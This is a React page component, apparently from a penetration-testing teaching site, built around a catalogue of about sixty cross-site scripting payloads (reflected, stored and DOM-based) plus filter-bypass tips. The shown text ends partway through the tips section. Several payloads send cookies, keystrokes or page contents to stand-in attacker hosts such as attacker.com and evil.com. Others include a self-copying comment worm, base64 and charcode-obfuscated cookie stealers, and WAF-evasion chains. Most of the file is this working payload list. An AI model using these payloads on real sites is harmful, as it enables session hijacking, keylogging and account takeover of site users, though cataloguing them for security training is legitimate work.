import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import VulnerabilityHeader from './components/VulnerabilityHeader';

import FilterControls from './components/FilterControls';
import PayloadCard from './components/PayloadCard';

import { RelatedVulnerabilities, ModeToggle } from '../../components/shared';

const XSSVulnerabilityDetails = () => {
  const [isProMode, setIsProMode] = useState(false);
  const [activeXSSType, setActiveXSSType] = useState('reflected');
  const [filters, setFilters] = useState({
    context: 'All',
    type: 'All',
    encoding: 'All'
  });
  const [filteredPayloads, setFilteredPayloads] = useState([]);

  const xssTypes = {
    reflected: {
      title: "Reflected XSS",
      explanation: "Reflected XSS occurs when user-supplied data is immediately returned by a web application in an error message, search result, or any other response without proper sanitization. The malicious script reflects off the web server and executes in the victim's browser when they click a crafted link or submit a malicious form. This is the most common type of XSS vulnerability.",
      whereItAppears: [
        "Search result pages that echo the search query",
        "Error messages displaying user input",
        "URL parameters reflected in page content",
        "Form validation errors showing submitted data",
        "Login forms reflecting usernames on failure"
      ],
      impact: "Reflected XSS enables attackers to steal session cookies, redirect users to phishing sites, inject keyloggers, deface websites temporarily, and perform actions on behalf of victims. While the attack requires user interaction (clicking a malicious link), it's highly effective in phishing campaigns and can lead to complete account takeover.",
      payloads: [
        {
          name: "Basic Script Tag",
          code: "<script>alert('XSS')</script>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Simple script injection in HTML context. Tests if any sanitization is present.",
          difficulty: "beginner"
        },
        {
          name: "IMG Onerror Event",
          code: "<img src=x onerror=alert('XSS')>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Image error event handler. Bypasses basic <script> tag filters.",
          difficulty: "beginner"
        },
        {
          name: "SVG Onload Event",
          code: "<svg onload=alert('XSS')>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "SVG element with onload event. Works in modern browsers and bypasses many content filters.",
          difficulty: "beginner"
        },
        {
          name: "Body Onload Attribute",
          code: "<body onload=alert('XSS')>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Body tag onload event. Executes when page loads if tag injection is possible.",
          difficulty: "beginner"
        },
        {
          name: "Input Autofocus Onfocus",
          code: "<input autofocus onFocus=alert('XSS')>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Input field with autofocus triggers onfocus event automatically. No user interaction needed.",
          difficulty: "beginner"
        },
        {
          name: "Attribute Breaking XSS",
          code: "\" onMouseOver=\"alert('XSS')",
          context: "Attribute",
          type: "Basic",
          encoding: "Plain",
          description: "Breaks out of HTML attribute context using double quotes to inject event handler.",
          difficulty: "intermediate"
        },
        {
          name: "Single Quote Attribute Break",
          code: "' onClick='alert(\"XSS\")'",
          context: "Attribute",
          type: "Basic",
          encoding: "Plain",
          description: "Breaks attribute context with single quotes. Alternative to double quote breaking.",
          difficulty: "intermediate"
        },
        {
          name: "JavaScript URL Protocol",
          code: "javascript:alert('XSS')",
          context: "Attribute",
          type: "Basic",
          encoding: "Plain",
          description: "JavaScript protocol in href or src attributes. Executes code when link is clicked.",
          difficulty: "intermediate"
        },
        {
          name: "Data URI XSS",
          code: "data:text/html,<script>alert('XSS')</script>",
          context: "Attribute",
          type: "Basic",
          encoding: "Plain",
          description: "Data URI scheme embeds HTML with JavaScript. Works in href attributes.",
          difficulty: "intermediate"
        },
        {
          name: "Backtick Template String",
          code: "<img src=x onerror=alert`XSS`>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Uses ES6 template strings to bypass parentheses filters. Modern browser syntax.",
          difficulty: "intermediate"
        },
        {
          name: "URL Encoded Payload",
          code: "%3Cscript%3Ealert('XSS')%3C/script%3E",
          context: "URL",
          type: "Bypass",
          encoding: "URL-encoded",
          description: "URL encoding bypasses basic string matching. Server must decode before rendering.",
          difficulty: "advanced"
        },
        {
          name: "Double URL Encoding",
          code: "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E",
          context: "URL",
          type: "Bypass",
          encoding: "URL-encoded",
          description: "Double encoding for filters that decode only once. Requires double decoding.",
          difficulty: "advanced"
        },
        {
          name: "Mixed Case Bypass",
          code: "<ScRiPt>alert('XSS')</sCrIpT>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "Mixed case bypasses case-sensitive filters. Simple but effective technique.",
          difficulty: "advanced"
        },
        {
          name: "HTML Entity Encoding",
          code: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "HTML entities encoded script tags. Browser decodes before execution.",
          difficulty: "advanced"
        },
        {
          name: "Character Code Execution",
          code: "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Character codes bypass string matching. Obfuscates alert('XSS') payload.",
          difficulty: "advanced"
        },
        {
          name: "Base64 Data URI",
          code: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\"></iframe>",
          context: "Attribute",
          type: "Bypass",
          encoding: "URL-encoded",
          description: "Base64 encoded HTML in data URI. Decodes to <script>alert('XSS')</script>.",
          difficulty: "advanced"
        },
        {
          name: "Polyglot XSS",
          code: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onMouseOver=1/+/[*/[]/+alert(1)//'>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "Multi-context payload works in HTML, attribute, and JavaScript contexts simultaneously.",
          difficulty: "advanced"
        },
        {
          name: "Mutation XSS (mXSS)",
          code: "<noscript>&lt;p title=\"</noscript><img src=x onerror=alert(1)>\">",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "Exploits browser HTML mutation during parsing. Bypasses sanitizers that parse differently.",
          difficulty: "advanced"
        },
        {
          name: "Filter Evasion Comment",
          code: "<script>&lt;!-- \nalert('XSS') \n//--&gt;</script>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "HTML comments and newlines bypass pattern matching. Confuses simple filters.",
          difficulty: "advanced"
        },
        {
          name: "Null Byte Injection",
          code: "<script>alert('XSS')%00</script>",
          context: "HTML",
          type: "Bypass",
          encoding: "URL-encoded",
          description: "Null byte terminates string matching in some filters. Language-dependent vulnerability.",
          difficulty: "advanced"
        }
      ]
    },
    stored: {
      title: "Stored XSS",
      explanation: "Stored XSS (Persistent XSS) is the most dangerous type of XSS. The malicious script is permanently stored on the target server (database, message forum, comment field, etc.) and executed every time a user accesses the affected page. Unlike reflected XSS, no user interaction is required beyond visiting the compromised page, making it highly effective for large-scale attacks.",
      whereItAppears: [
        "Comment sections and user forums",
        "User profile pages (bio, name, status)",
        "Message boards and chat applications",
        "Product reviews and ratings",
        "Blog posts and article submissions",
        "File upload metadata (filenames, descriptions)"
      ],
      impact: "Stored XSS has devastating potential as it affects all users who view the infected content. Attackers can create self-propagating XSS worms, steal credentials from multiple users, inject persistent backdoors, modify site content for all visitors, and launch mass phishing campaigns. The persistent nature makes it particularly dangerous in administrative interfaces where privileged accounts are targeted.",
      payloads: [
        {
          name: "Comment Field XSS",
          code: "<script>fetch('//attacker.com?c='+document.cookie)</script>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Cookie exfiltration from comment field. Steals session tokens from all viewers.",
          difficulty: "beginner"
        },
        {
          name: "Profile Bio XSS",
          code: "<img src=x onerror=\"fetch('//evil.com?d='+btoa(document.body.innerHTML))\">",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Exfiltrates entire page HTML from profile bio. Encodes with base64 to avoid encoding issues.",
          difficulty: "beginner"
        },
        {
          name: "Forum Post Keylogger",
          code: "<script>document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}</script>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Keylogger injection in forum post. Captures all keystrokes from viewing users.",
          difficulty: "beginner"
        },
        {
          name: "Self-Propagating XSS Worm",
          code: "<script>fetch('/api/comment',{method:'POST',body:JSON.stringify({text:document.body.innerHTML})})</script>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Worm that copies itself to new comments. Spreads automatically to all comment sections.",
          difficulty: "beginner"
        },
        {
          name: "Username XSS",
          code: "<svg/onload=navigator.sendBeacon('//evil.com',document.cookie)>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Stored in username field. SendBeacon ensures data transmission even if page unloads.",
          difficulty: "beginner"
        },
        {
          name: "Filename Metadata XSS",
          code: "\"><script>alert(document.domain)</script>.jpg",
          context: "Attribute",
          type: "Basic",
          encoding: "Plain",
          description: "Malicious filename with XSS payload. Executes when filename is displayed without sanitization.",
          difficulty: "intermediate"
        },
        {
          name: "Product Review XSS",
          code: "<iframe src=javascript:alert(origin)>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Iframe with JavaScript URI in product review. Shows origin to verify context.",
          difficulty: "intermediate"
        },
        {
          name: "Message Board Avatar",
          code: "<img src='x' onerror='eval(atob(\"ZG9jdW1lbnQubG9jYXRpb249Ii8vYXR0YWNrZXIuY29tP2M9Iithb3RvYSggZG9jdW1lbnQuY29va2llKQ==\"))'>",
          context: "Attribute",
          type: "Event-based",
          encoding: "Plain",
          description: "Base64 encoded payload in avatar img tag. Decodes to cookie stealing redirect.",
          difficulty: "intermediate"
        },
        {
          name: "Chat Message HTML Injection",
          code: "<style>body{background:url('//evil.com?c='concat(document.cookie))}</style>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "CSS exfiltration via background URL. Works even if script tags are filtered.",
          difficulty: "intermediate"
        },
        {
          name: "User Status XSS",
          code: "<details open ontoggle=alert(document.domain)>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "HTML5 details element with ontoggle event. Fires immediately when rendered open.",
          difficulty: "intermediate"
        },
        {
          name: "Blog Post Script Storage",
          code: "<script>setInterval(()=&gt;fetch('//log.com?u='+document.location),5000)</script>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "Periodic location tracking. Logs user navigation every 5 seconds.",
          difficulty: "advanced"
        },
        {
          name: "Comment Mutation Bypass",
          code: "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "MathML mutation XSS. Browser HTML parser mutations bypass sanitizers.",
          difficulty: "advanced"
        },
        {
          name: "Markdown to HTML XSS",
          code: "[XSS](javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "Markdown link with JavaScript URI containing base64 payload. Targets Markdown renderers.",
          difficulty: "advanced"
        },
        {
          name: "BBCode Forum XSS",
          code: "[url=javascript:alert(document.cookie)]Click[/url]",
          context: "Attribute",
          type: "Bypass",
          encoding: "Plain",
          description: "BBCode URL tag with JavaScript protocol. Exploits BBCode parsers in forums.",
          difficulty: "advanced"
        },
        {
          name: "Rich Text Editor Bypass",
          code: "<p contenteditable onBlur=alert(1)>Click to edit</p>",
          context: "HTML",
          type: "Event-based",
          encoding: "Plain",
          description: "Contenteditable with onblur event. Fires when user interacts and clicks away.",
          difficulty: "advanced"
        },
        {
          name: "JSON Stored XSS",
          code: "{\"name\":\"<img src=x onerror=alert(1)>\",\"message\":\"test\"}",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "XSS payload in JSON field. Executes when JSON is rendered as HTML without escaping.",
          difficulty: "advanced"
        },
        {
          name: "XML Entity Stored XSS",
          code: "<?xml version=\"1.0\"?><comment><text><![CDATA[<script>alert(1)</script>]]></text></comment>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "CDATA section in XML comment. Bypasses XML sanitization if rendered as HTML.",
          difficulty: "advanced"
        },
        {
          name: "Template Engine Injection",
          code: "{{constructor.constructor('alert(document.domain)')()}}",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Server-side template injection. Breaks out of template sandbox to execute code.",
          difficulty: "advanced"
        },
        {
          name: "SVG Stored Foreign Object",
          code: "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
          context: "HTML",
          type: "Basic",
          encoding: "Plain",
          description: "SVG foreignObject with embedded HTML script. Bypasses SVG-only content restrictions.",
          difficulty: "advanced"
        },
        {
          name: "Unicode Normalization XSS",
          code: "<ſcript>alert(1)</ſcript>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "Unicode lookalike characters (ſ = long s). Normalizes to 'script' after storage.",
          difficulty: "advanced"
        }
      ]
    },
    "dom-based": {
      title: "DOM-Based XSS",
      explanation: "DOM-Based XSS is a client-side vulnerability where the attack payload is executed through modifying the DOM environment in the victim's browser. Unlike reflected and stored XSS, the malicious script never touches the web server. Instead, it exploits client-side JavaScript that unsafely processes user-controllable data from sources like URL fragments, localStorage, or postMessage. The vulnerability exists entirely in the client-side code's handling of the DOM.",
      whereItAppears: [
        "URL hash/fragment (#) processing in JavaScript",
        "Client-side routing in Single Page Applications",
        "JavaScript reading window.location properties",
        "localStorage/sessionStorage data rendering",
        "postMessage event handlers",
        "Client-side template rendering engines",
        "JavaScript frameworks with unsafe data binding"
      ],
      impact: "DOM-Based XSS is particularly dangerous because it bypasses server-side protections entirely. Traditional WAFs and server-side input validation cannot detect these attacks since the malicious payload is processed entirely client-side. Attackers can exploit client-side routing, steal sensitive data from JavaScript memory, bypass CSP in certain configurations, and compromise single-page applications where sensitive operations occur client-side.",
      payloads: [
        {
          name: "Location Hash XSS",
          code: "#<img src=x onerror=alert(document.domain)>",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "URL fragment processed by JavaScript. Common in client-side routing and anchor handling.",
          difficulty: "beginner"
        },
        {
          name: "Location Search Parameter",
          code: "?search=<img src=x onerror=alert(1)>",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Query parameter accessed via location.search. Vulnerable if directly rendered in DOM.",
          difficulty: "beginner"
        },
        {
          name: "Document.write DOM XSS",
          code: "#<script>document.write('<img src=x onerror=alert(1)>')</script>",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Document.write with unsanitized input. Direct DOM manipulation without validation.",
          difficulty: "beginner"
        },
        {
          name: "InnerHTML Sink",
          code: "#<img src=x onerror=this.src='//evil.com?c='+document.cookie>",
          context: "JavaScript",
          type: "Event-based",
          encoding: "Plain",
          description: "innerHTML assignment with URL fragment. Cookie exfiltration via img src manipulation.",
          difficulty: "beginner"
        },
        {
          name: "Eval DOM Source",
          code: "#';alert(document.domain);//",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Breaking out of eval() statement. Single quote breaks context, semicolon ends statement.",
          difficulty: "beginner"
        },
        {
          name: "Client-side Template XSS",
          code: "#{{constructor.constructor('alert(1)')()}}",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Template injection in client-side frameworks. Constructor chain escapes sandbox.",
          difficulty: "intermediate"
        },
        {
          name: "PostMessage XSS",
          code: "<iframe src='//evil.com' onload='this.contentWindow.postMessage({\"__proto__\":{\"isAdmin\":true}},\"*\")'></iframe>",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Prototype pollution via postMessage. Injects admin privilege through proto chain.",
          difficulty: "intermediate"
        },
        {
          name: "localStorage XSS",
          code: "localStorage.setItem('theme','<img src=x onerror=alert(origin)>');",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Persistent DOM XSS via localStorage. Executes every time stored value is rendered.",
          difficulty: "intermediate"
        },
        {
          name: "DOM Clobbering",
          code: "<form name=test><input name=action value='javascript:alert(1)'>",
          context: "HTML",
          type: "Bypass",
          encoding: "Plain",
          description: "HTML id/name attributes override DOM properties. Clobbers form.action for XSS.",
          difficulty: "intermediate"
        },
        {
          name: "Angular Expression Injection",
          code: "{{constructor.constructor('alert(1)')()}}",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Angular 1.x template injection. Constructor chain breaks sandbox protection.",
          difficulty: "intermediate"
        },
        {
          name: "Vue.js Template Injection",
          code: "{{_c.constructor('alert(1)')()}}",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Vue.js compilation context escape. _c is Vue\'s createElement shorthand.",
          difficulty: "advanced"
        },
        {
          name: "React dangerouslySetInnerHTML",
          code: "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "React\'s explicit HTML rendering. Bypasses React\'s XSS protection when misused.",
          difficulty: "advanced"
        },
        {
          name: "Prototype Pollution to XSS",
          code: "?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Pollutes Object.prototype.innerHTML. Affects all objects inheriting from Object.",
          difficulty: "advanced"
        },
        {
          name: "DOM-based Open Redirect XSS",
          code: "#javascript:alert(document.domain)",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "JavaScript protocol in location assignment. Executes when page redirects to hash value.",
          difficulty: "advanced"
        },
        {
          name: "Web Worker XSS",
          code: "new Worker('data:text/javascript,alert(origin)')",
          context: "JavaScript",
          type: "Basic",
          encoding: "Plain",
          description: "Data URI in Web Worker. Executes JavaScript in worker thread context.",
          difficulty: "advanced"
        },
        {
          name: "ServiceWorker Registration XSS",
          code: "navigator.serviceWorker.register('data:text/javascript,self.addEventListener(\"fetch\",e=>e.respondWith(new Response(\"<script>alert(1)</script>\")))')",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "ServiceWorker with data URI. Intercepts all fetch requests to inject payloads.",
          difficulty: "advanced"
        },
        {
          name: "Mutation Observer XSS",
          code: "new MutationObserver(m=>eval(m[0].addedNodes[0].textContent)).observe(document.body,{childList:true});setTimeout(()=>document.body.innerHTML+='<x>alert(1)</x>',100)",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "MutationObserver eval on DOM changes. Monitors and executes newly added content.",
          difficulty: "advanced"
        },
        {
          name: "RegExp Source Injection",
          code: "new RegExp(location.hash.slice(1)).source; // Hash: #(?=.*eval(alert(1)))",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "RegExp lookahead execution. Positive lookahead (?=) evaluates expression as code.",
          difficulty: "advanced"
        },
        {
          name: "ArrayBuffer toString XSS",
          code: "new Uint8Array([60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]).reduce((a,b)=>a+String.fromCharCode(b),'')",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "Byte array to string conversion. Obfuscates '<script>alert(1)</script>' as bytes.",
          difficulty: "advanced"
        },
        {
          name: "WebAssembly Instance XSS",
          code: "WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,6,1,96,0,1,127,3,2,1,0,7,10,1,6,105,110,118,111,107,101,0,0,10,9,1,7,0,65,42,106,252,11]),{env:{alert:alert}}).then(({instance})=>instance.exports.invoke())",
          context: "JavaScript",
          type: "Bypass",
          encoding: "Plain",
          description: "WebAssembly calling JavaScript alert. Binary WASM module with imported alert function.",
          difficulty: "advanced"
        }
      ]
    }
  };

  const commonMistakes = [
    {
      title: "Only Testing <script> Tags",
      description: "Many beginners focus solely on <script> injection and miss event handlers, SVG, and attribute-based XSS that bypass script tag filters.",
      icon: "AlertCircle"
    },
    {
      title: "Ignoring Context",
      description: "Testing HTML payloads in JavaScript context or vice versa. Understanding injection context (HTML, attribute, JavaScript, URL) is critical for successful exploitation.",
      icon: "Code"
    },
    {
      title: "Not Testing Encoding",
      description: "Failing to test URL encoding, HTML entities, and Unicode normalization. Many filters can be bypassed with proper encoding techniques.",
      icon: "Hash"
    },
    {
      title: "Missing DOM Sinks",
      description: "Overlooking client-side JavaScript that processes user input. DOM-based XSS vulnerabilities exist entirely in browser JavaScript and aren\'t visible in server responses.",
      icon: "Eye"
    },
    {
      title: "Skipping Stored XSS Testing",
      description: "Not testing comment sections, profiles, and user-generated content areas. Stored XSS has the highest impact but requires patience to test properly.",
      icon: "Database"
    },
    {
      title: "Assuming WAF = Protected",
      description: "Believing WAFs provide complete protection. WAFs can be bypassed with encoding, case manipulation, and context-specific payloads. Always test thoroughly.",
      icon: "Shield"
    }
  ];

  const proTips = [
    {
      title: "Context is King",
      tip: "The same payload won't work in every context. Identify whether you're in HTML, JavaScript, attribute, or URL context and craft payloads accordingly. Use browser DevTools to inspect exactly where your input lands.",
      icon: "Target"
    },
    {
      title: "DOM XSS Requires Client-Side Analysis",
      tip: "Traditional scanners miss DOM-based XSS. Search source code for dangerous sinks: innerHTML, document.write, eval. Track data flow from URL fragments, postMessage, and localStorage to these sinks.",
      icon: "Search"
    },
    {
      title: "Stored XSS in Admin Panels",
      tip: "Admin interfaces often have weaker validation since they're considered 'trusted'. Target admin-only features like user management, logs, and configuration pages for high-impact stored XSS.",
      icon: "ShieldAlert"
    },
    {
      title: "Bypass WAFs with Encoding Chains",
      tip: "Chain multiple encoding techniques: URL encode, then HTML entity encode, then case manipulation. WAFs often decode only once. Test double encoding and mixed encodings systematically.",
      icon: "Zap"
    },
    {
      title: "Polyglot Payloads for Maximum Impact",
      tip: "Craft payloads that work in multiple contexts simultaneously. Polyglot XSS reduces the need to identify exact injection point and increases success rate in complex applications.",
      icon: "Layers"
    },
    {
      title: "Test Client-Side Frameworks",
      tip: "Modern frameworks (React, Vue, Angular) have specific XSS vectors. Research framework-specific bypasses: template injection, prototype pollution, unsafe component properties. Each framework has unique attack surface.",
      icon: "Cpu"
    }
  ];

  const relatedVulnerabilities = [
    {
      name: "CRLF Injection",
      description: "HTTP response splitting vulnerability that allows attackers to inject arbitrary HTTP headers through carriage return and line feed characters.",
      severity: "high",
      icon: "FileText",
      path: "/crlf-injection"
    },
    {
      name: "IDOR Vulnerability",
      description: "Access control flaw where attackers access unauthorized resources by manipulating object identifiers in requests.",
      severity: "medium",
      icon: "Lock",
      path: "/idor"
    },
    {
      name: "OTP Bypass",
      description: "Authentication logic flaws allowing attackers to bypass one-time password verification and gain unauthorized access.",
      severity: "high",
      icon: "KeyRound",
      path: "/otp-bypass"
    }
  ];

  const currentXSSData = xssTypes?.[activeXSSType];

  useEffect(() => {
    filterPayloads();
  }, [filters, activeXSSType, isProMode]);

  const filterPayloads = () => {
    let filtered = [...currentXSSData?.payloads];

    // Filter by difficulty based on mode
    if (!isProMode) {
      // Beginner mode: only show beginner and intermediate difficulty
      filtered = filtered?.filter(p => 
        p?.difficulty === 'beginner' || p?.difficulty === 'intermediate'
      );
    }
    // Elite mode shows all payloads (no difficulty filter)

    // Apply context filter
    if (filters?.context !== 'All') {
      filtered = filtered?.filter(p => p?.context === filters?.context);
    }

    // Apply type filter
    if (filters?.type !== 'All') {
      filtered = filtered?.filter(p => p?.type === filters?.type);
    }

    // Apply encoding filter
    if (filters?.encoding !== 'All') {
      filtered = filtered?.filter(p => p?.encoding === filters?.encoding);
    }

    setFilteredPayloads(filtered);
  };

  const handleFilterChange = (filterType, value) => {
    setFilters(prev => ({
      ...prev,
      [filterType]: value
    }));
  };

  const handleModeToggle = (isPro) => {
    setIsProMode(isPro);
  };

  return (
    <>
      <Helmet>
        <title>Cross-Site Scripting (XSS) - Comprehensive Guide - TrinetLayer</title>
        <meta name="description" content="Complete guide to XSS vulnerabilities: Reflected, Stored, and DOM-Based XSS with 60 real-world payloads, exploitation techniques, and security best practices for penetration testers." />
        <meta name="keywords" content="XSS vulnerability, reflected XSS, stored XSS, DOM XSS, cross-site scripting, web security, penetration testing, bug bounty, XSS payloads" />
      </Helmet>
      <div className="min-h-screen bg-background">
        <Sidebar />

        <main className="lg:ml-[280px] min-h-screen lg:w-[calc(100%-280px)] overflow-x-hidden">
          <div className="sticky top-0 z-40 bg-background/80 backdrop-blur-xl border-b border-border">
            <div className="max-w-[1400px] mx-auto pl-16 pr-4 md:px-6 lg:px-8 py-4 md:py-5">
              <GlobalSearch />
            </div>
          </div>

          <div className="max-w-[1400px] mx-auto px-4 md:px-6 lg:px-8 py-6 md:py-8 lg:py-10">
            <Breadcrumb />

            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4 mb-6 md:mb-8">
              <div>
                <h2 className="text-xl md:text-2xl font-semibold text-foreground mb-2">
                  Vulnerability Deep Dive
                </h2>
                <p className="text-sm md:text-base text-muted-foreground">
                  Comprehensive analysis and exploitation techniques
                </p>
              </div>
              <ModeToggle 
                mode={isProMode ? 'pro' : 'beginner'} 
                onToggle={(mode) => setIsProMode(mode === 'pro')} 
              />
            </div>

            <VulnerabilityHeader
              title="Cross-Site Scripting (XSS)"
              severity="high"
              lastUpdated="Jan 16, 2026"
            />

            {/* XSS Type Selector */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h3 className="text-lg font-semibold text-foreground mb-4">
                Select XSS Type
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {Object.entries(xssTypes)?.map(([key, data]) => (
                  <button
                    key={key}
                    onClick={() => setActiveXSSType(key)}
                    className={`p-4 rounded-lg border-2 transition-all ${
                      activeXSSType === key
                        ? 'border-accent bg-accent/10 text-accent' :'border-border bg-background text-muted-foreground hover:border-accent/50'
                    }`}
                  >
                    <div className="text-left">
                      <div className="font-semibold mb-1">{data?.title}</div>
                      <div className="text-sm opacity-80">{data?.payloads?.length} Payloads</div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Current XSS Type Content */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h2 className="text-2xl font-bold text-foreground mb-4">
                {currentXSSData?.title}
              </h2>
              
              {/* Explanation */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">What is {currentXSSData?.title}?</h3>
                <p className="text-muted-foreground leading-relaxed">
                  {currentXSSData?.explanation}
                </p>
              </div>

              {/* Where It Appears */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">Where It Appears</h3>
                <ul className="space-y-2">
                  {currentXSSData?.whereItAppears?.map((location, index) => (
                    <li key={index} className="flex items-start gap-2 text-muted-foreground">
                      <span className="text-accent mt-1">▸</span>
                      <span>{location}</span>
                    </li>
                  ))}
                </ul>
              </div>

              {/* Impact */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">Impact</h3>
                <p className="text-muted-foreground leading-relaxed">
                  {currentXSSData?.impact}
                </p>
              </div>
            </div>

            <FilterControls
              filters={filters}
              onFilterChange={handleFilterChange}
              isProMode={isProMode}
              onModeToggle={handleModeToggle}
              xssType={activeXSSType}
            />

            {/* Payloads Section */}
            <div className="mb-6 md:mb-8 lg:mb-10">
              <div className="flex items-center justify-between mb-6 md:mb-8">
                <h2 className="text-xl md:text-2xl lg:text-3xl font-semibold text-foreground">
                  {currentXSSData?.title} Payloads
                </h2>
                <div className="flex items-center gap-3">
                  <div className="text-sm md:text-base text-muted-foreground font-medium">
                    {filteredPayloads?.length} {filteredPayloads?.length === 1 ? 'payload' : 'payloads'}
                  </div>
                  {!isProMode && (
                    <div className="px-3 py-1 bg-accent/10 border border-accent/30 rounded-lg">
                      <span className="text-xs font-medium text-accent">Beginner-Friendly Mode</span>
                    </div>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 md:gap-8">
                {filteredPayloads?.map((payload, index) => (
                  <PayloadCard
                    key={index}
                    payload={payload}
                    isProMode={isProMode}
                  />
                ))}
              </div>

              {filteredPayloads?.length === 0 && (
                <div className="text-center py-12 md:py-16 lg:py-20">
                  <div className="w-16 h-16 md:w-20 md:h-20 mx-auto mb-4 md:mb-6 flex items-center justify-center bg-muted/30 border border-border rounded-xl">
                    <svg className="w-8 h-8 md:w-10 md:h-10 text-muted-foreground" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                  </div>
                  <h3 className="text-lg md:text-xl font-body font-medium text-foreground mb-2">
                    No payloads found
                  </h3>
                  <p className="text-sm md:text-base text-muted-foreground font-medium">
                    Try adjusting your filters to see more results
                  </p>
                </div>
              )}
            </div>

            {/* Common Mistakes */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h2 className="text-2xl font-bold text-foreground mb-6">
                Common Mistakes to Avoid
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {commonMistakes?.map((mistake, index) => (
                  <div key={index} className="flex gap-4 p-4 bg-background border border-border rounded-lg">
                    <div className="flex-shrink-0">
                      <div className="w-10 h-10 rounded-lg bg-warning/10 flex items-center justify-center">
                        <svg className="w-5 h-5 text-warning" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                        </svg>
                      </div>
                    </div>
                    <div>
                      <h3 className="font-semibold text-foreground mb-2">{mistake?.title}</h3>
                      <p className="text-sm text-muted-foreground">{mistake?.description}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Pro Bug Hunter Tips */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
